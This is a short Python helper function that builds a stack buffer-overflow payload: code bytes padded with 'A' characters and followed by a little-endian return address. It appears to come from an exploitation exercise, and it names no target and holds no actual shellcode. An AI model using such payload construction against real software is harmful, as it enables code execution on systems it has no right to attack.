def get_payload(hellocode, hellocode_padding_n, address_little_endian):
    hellocode_n = len(hellocode)
    padding_n = hellocode_padding_n - hellocode_n
    padding = 'A' * padding_n
    payload = hellocode + padding + address_little_endian
    return payload